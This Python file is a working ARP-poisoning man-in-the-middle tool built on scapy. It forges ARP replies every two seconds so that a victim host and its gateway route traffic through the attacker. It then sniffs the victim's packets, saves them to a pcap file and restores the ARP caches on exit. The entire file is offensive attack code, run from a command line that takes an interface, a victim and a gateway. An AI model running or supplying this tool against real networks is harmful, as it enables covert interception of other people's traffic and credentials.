from multiprocessing import Process
from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, srp, wrpcap
import os
import sys
import time

def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=targetip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

class Arper:
    def __init__(self, victim, gateway, interface='en0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        self.packets = []

    def run(self):
        print(f'[*] Setting up {self.interface}')
        print(f'[*] Gateway: {self.gateway} is at {self.gatewaymac}')
        print(f'[*] Victim:  {self.victim} is at {self.victimmac}')
        print('[*] Starting ARP poison...')
        poison_thread = Process(target=self.poison)
        poison_thread.start()
        try:
            sniff_filter = f'ip host {self.victim}'
            sniff(prn=self.pkt_callback, filter=sniff_filter, store=0, count=100)
        except KeyboardInterrupt:
            pass
        finally:
            self.restore()
            poison_thread.terminate()
            wrpcap('arper.pcap', self.packets)

    def pkt_callback(self, packet):
        self.packets.append(packet)

    def poison(self):
        poison_victim = ARP(op=2, psrc=self.gateway, pdst=self.victim, hwdst=self.victimmac)
        poison_gateway = ARP(op=2, psrc=self.victim, pdst=self.gateway, hwdst=self.gatewaymac)
        while True:
            send(poison_victim, verbose=False)
            send(poison_gateway, verbose=False)
            time.sleep(2)

    def restore(self):
        send(ARP(op=2, psrc=self.gateway, pdst=self.victim, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=self.gatewaymac), count=5, verbose=False)
        send(ARP(op=2, psrc=self.victim, pdst=self.gateway, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=self.victimmac), count=5, verbose=False)

def main():
    if len(sys.argv[1:]) != 3:
        print(f'Usage: {sys.argv[0]} <interface> <victim> <gateway>')
        sys.exit(0)
    interface, victim, gateway = sys.argv[1], sys.argv[2], sys.argv[3]
    arper = Arper(victim, gateway, interface)
    arper.run()

if __name__ == '__main__':
    main()